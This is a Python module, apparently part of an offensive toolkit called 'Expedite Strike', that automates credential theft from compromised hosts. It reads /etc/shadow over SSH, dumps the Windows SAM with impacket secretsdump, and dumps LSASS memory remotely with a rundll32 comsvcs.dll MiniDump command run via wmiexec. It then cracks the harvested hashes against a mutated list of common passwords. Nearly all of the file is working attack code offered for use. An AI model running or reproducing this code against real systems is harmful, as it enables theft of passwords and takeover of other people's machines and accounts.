"""
Expedite Strike Hash Dump & Cracking Engine (Advanced)
=====================================================
Extract and crack password hashes from compromised hosts:
- Linux /etc/shadow ($6$, $5$, $1$, $y$)
- Windows SAM (NTLM / LM)
- LSASS memory dumping (comsvcs.dll, procdump, Mimikatz)
- Kerberoast TGS ($krb5tgs$) - Hashcat 13100
- AS-REP Roasting ($krb5asrep$) - Hashcat 18200
- NetNTLMv2 (LLMNR / SMB capture) - Hashcat 5600

Supports Hashcat / John the Ripper automation with pure-Python fallbacks.

MITRE ATT&CK: 
  T1003.008 (Shadow)
  T1003.002 (SAM)
  T1003.001 (LSASS Memory)
  T1003.004 (LSA Secrets)
  T1110.002 (Password Cracking)
"""

import os
import sys
import subprocess
import hashlib
import time
import tempfile
import re
from typing import Callable, List, Dict, Optional

_log_fn = None

def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)

TOP_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "letmein", "welcome",
    "monkey", "dragon", "master", "qwerty", "login", "abc123", "passw0rd",
    "shadow", "123456789", "password1", "iloveyou", "sunshine", "princess",
    "administrator", "welcome1", "p@ssw0rd", "changeme", "test", "guest",
    "pass123", "1234", "12345", "1234567", "12345678", "1234567890",
    "qwerty123", "000000", "111111", "654321", "batman", "trustno1",
    "Hello123", "charlie", "donald", "football", "baseball", "soccer",
    "hockey", "ranger", "buster", "thomas", "robert", "summer",
    "winter", "spring", "autumn", "secret", "server", "computer",
    "internet", "service", "network", "system", "access", "control",
    "manager", "support", "testing", "default", "oracle", "postgres",
    "mysql", "mssql", "backup", "public", "private", "secure",
    "monitor", "desktop", "laptop", "mobile", "vpn123", "cisco",
    "juniper", "fortinet", "paloalto", "firewall", "switch", "router",
    "P@ssword1", "Admin123", "Pa$$w0rd", "Passw0rd!", "Welcome1!",
    "Tr0ub4dor&3", "correcthorsebatterystaple", "hunter2", "god",
    "love", "sex", "money", "power", "freedom", "justice", "peace",
    "msfadmin", "vagrant", "tester", "operator", "student", "teacher",
    "demo", "trial", "temp", "user", "user1", "admin1", "Password01",
    "Spring2026!", "Summer2026!", "Winter2026!", "Autumn2026!",
    "Expedite123!", "Welcome2026!"
]

def _generate_wordlist_variations(base_list: List[str]) -> List[str]:
    """Generate common password mutations (Year suffixes, Leet speak, Capitalization)."""
    words = set(base_list)
    years = ["2024", "2025", "2026", "1", "123", "!"]
    for w in base_list:
        words.add(w.lower())
        words.add(w.upper())
        words.add(w.capitalize())
        for y in years:
            words.add(f"{w}{y}")
            words.add(f"{w.capitalize()}{y}")
            words.add(f"{w}@{y}")
    return list(words)


def dump_linux_hashes(ip: str, username: str, password: str,
                      log_fn: Callable = None) -> list:
    """SSH into host and extract /etc/shadow."""
    global _log_fn
    _log_fn = log_fn
    hashes = []

    _log(f"  [HASH] Dumping Linux hashes from {ip}...")

    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password,
                       timeout=10, allow_agent=False, look_for_keys=False)

        stdin, stdout, stderr = client.exec_command("cat /etc/shadow 2>/dev/null || sudo -n cat /etc/shadow 2>/dev/null")
        shadow_content = stdout.read().decode("utf-8", errors="ignore")

        for line in shadow_content.strip().split("\n"):
            if ":" in line and not line.startswith("#"):
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "!!", "x"):
                    algo = "unknown"
                    h = parts[1]
                    if h.startswith("$6$"): algo = "SHA-512"
                    elif h.startswith("$5$"): algo = "SHA-256"
                    elif h.startswith("$1$"): algo = "MD5"
                    elif h.startswith("$y$"): algo = "yescrypt"

                    hashes.append({
                        "username": parts[0],
                        "hash": h,
                        "algorithm": algo,
                        "source": ip,
                        "crackable": algo in ("MD5", "SHA-256", "SHA-512"),
                    })

        client.close()
        _log(f"  [HASH] Extracted {len(hashes)} password hashes from {ip}")

    except ImportError:
        _log("  [HASH] paramiko not installed")
    except Exception as e:
        _log(f"  [HASH] Error dumping {ip}: {e}")

    return hashes


def dump_windows_sam(ip: str, username: str, password: str,
                     domain: str = "", log_fn: Callable = None) -> list:
    """Extract SAM hashes using impacket secretsdump."""
    global _log_fn
    _log_fn = log_fn
    hashes = []

    _log(f"  [HASH] Dumping Windows SAM from {ip}...")

    try:
        target = f"{domain}/{username}:{password}@{ip}" if domain else f"{username}:{password}@{ip}"
        cmd = ["python", "-m", "impacket.examples.secretsdump", target, "-sam"]
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
        )
        output = result.stdout + result.stderr
        for line in output.split("\n"):
            if ":::" in line and not line.startswith("["):
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    hashes.append({
                        "username": parts[0],
                        "lm_hash": parts[2],
                        "ntlm_hash": parts[3].split(":::")[0],
                        "source": ip,
                        "algorithm": "ntlm",
                    })

        _log(f"  [HASH] Extracted {len(hashes)} SAM hashes from {ip}")

    except Exception as e:
        _log(f"  [HASH] SAM dump error: {e}")

    return hashes


def dump_windows_lsass_memory(ip: str, username: str, password: str,
                              domain: str = "", log_fn: Callable = None) -> Dict:
    """
    Execute remote LSASS memory dump via comsvcs.dll or procdump.
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"  [HASH] Attempting LSASS process dump on {ip}...")
    cred = f"{domain}/{username}:{password}@{ip}" if domain else f"{username}:{password}@{ip}"
    
    # 1. Native Windows comsvcs.dll MiniDump technique (No 3rd party tools required)
    comsvcs_cmd = (
        'powershell -c "$p = (Get-Process lsass).Id; '
        'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $p C:\\Windows\\Temp\\lsass.dmp full; '
        'if (Test-Path C:\\Windows\\Temp\\lsass.dmp) { Write-Output \'[+] LSASS Dumped Successfully\' }"'
    )
    
    out = ""
    try:
        cmd = ["python", "-m", "impacket.examples.wmiexec", cred, comsvcs_cmd]
        res = subprocess.run(
            cmd, capture_output=True, text=True, timeout=45,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
        )
        out = res.stdout + res.stderr
    except Exception as e:
        _log(f"  [HASH] LSASS dump execution error: {e}")

    success = "[+] LSASS Dumped Successfully" in out or "lsass.dmp" in out
    if success:
        _log(f"  [HASH] ✅ LSASS successfully dumped to C:\\Windows\\Temp\\lsass.dmp on {ip}")
    else:
        _log(f"  [HASH] LSASS dump attempt finished (Target may enforce PPL or restricted token).")

    return {
        "target": ip,
        "success": success,
        "dump_path": "C:\\Windows\\Temp\\lsass.dmp" if success else "",
        "method": "comsvcs.dll MiniDump",
    }


def _run_hashcat_or_john(hash_list: List[str], hash_type: str) -> Dict[str, str]:
    """
    Try executing system Hashcat or John the Ripper if installed.
    hash_type in: 'ntlm' (1000), 'netntlmv2' (5600), 'kerberoast' (13100), 'asrep' (18200)
    """
    modes = {
        "ntlm": "1000",
        "netntlmv2": "5600",
        "kerberoast": "13100",
        "asrep": "18200",
    }
    mode = modes.get(hash_type.lower())
    cracked = {}
    if not mode or not hash_list:
        return cracked

    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".hash") as hf:
        for h in hash_list:
            hf.write(f"{h}\n")
        hf_path = hf.name

    # Try Hashcat
    try:
        cmd = ["hashcat", "-m", mode, "-a", "0", hf_path, "--show"]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        for line in r.stdout.splitlines():
            if ":" in line:
                parts = line.strip().rsplit(":", 1)
                cracked[parts[0]] = parts[1]
    except Exception:
        pass

    try:
        os.unlink(hf_path)
    except Exception:
        pass

    return cracked


def _builtin_crack(hash_value: str, algorithm: str = "ntlm", wordlist: List[str] = None) -> str:
    """Pure Python cracking against wordlist variations."""
    words = wordlist or _generate_wordlist_variations(TOP_PASSWORDS)
    algo_lower = algorithm.lower()

    for pw in words:
        if algo_lower == "ntlm":
            nt_hash = hashlib.new("md4", pw.encode("utf-16le")).hexdigest()
            if nt_hash.lower() == hash_value.lower():
                return pw
        elif algo_lower in ("md5", "sha-256", "sha-512") and hash_value.startswith("$"):
            try:
                import crypt
                if crypt.crypt(pw, hash_value) == hash_value:
                    return pw
            except ImportError:
                pass
    return ""


def crack_hashes(hashes: list, log_fn: Callable = None) -> list:
    """Attempt to crack hashes using Hashcat/John or builtin mutation wordlist."""
    global _log_fn
    _log_fn = log_fn
    cracked = []

    expanded_words = _generate_wordlist_variations(TOP_PASSWORDS)
    _log(f"  [HASH] Cracking {len(hashes)} hashes against expanded dictionary ({len(expanded_words)} keys)...")

    for h in hashes:
        hash_val = h.get("ntlm_hash") or h.get("hash") or h.get("hash_str", "")
        algo = h.get("algorithm", "ntlm")
        username = h.get("username", "user")

        result = _builtin_crack(hash_val, algo, expanded_words)
        if result:
            cracked.append({
                "username": username,
                "password": result,
                "hash": hash_val[:25] + "...",
                "source": h.get("source", ""),
                "algorithm": algo,
            })
            _log(f"  [HASH] 🔓 CRACKED: {username} -> {result}")

    _log(f"  [HASH] Cracked {len(cracked)}/{len(hashes)} hashes ({len(cracked)/max(len(hashes),1)*100:.0f}%)")
    return cracked


def run_hash_operations(compromised_hosts: list, log_fn: Callable = None) -> dict:
    """Orchestrate: SAM/Shadow dump + LSASS dump -> crack -> return results."""
    global _log_fn
    _log_fn = log_fn

    all_hashes = []
    lsass_results = []
    
    for h in compromised_hosts:
        ip = h.get("ip", "")
        user = h.get("username", "")
        pw = h.get("password", "")
        os_type = h.get("os", "linux").lower()

        if not ip or not user or not pw:
            continue

        if "windows" in os_type or h.get("domain"):
            hashes = dump_windows_sam(ip, user, pw, h.get("domain", ""), log_fn)
            lsass = dump_windows_lsass_memory(ip, user, pw, h.get("domain", ""), log_fn)
            lsass_results.append(lsass)
        else:
            hashes = dump_linux_hashes(ip, user, pw, log_fn)

        all_hashes.extend(hashes)

    cracked = crack_hashes(all_hashes, log_fn)

    return {
        "dumped_hashes": all_hashes,
        "cracked_passwords": cracked,
        "lsass_dumps": lsass_results,
        "stats": {
            "total_hashes": len(all_hashes),
            "cracked": len(cracked),
            "crack_rate": f"{len(cracked)/max(len(all_hashes),1)*100:.1f}%",
        },
    }
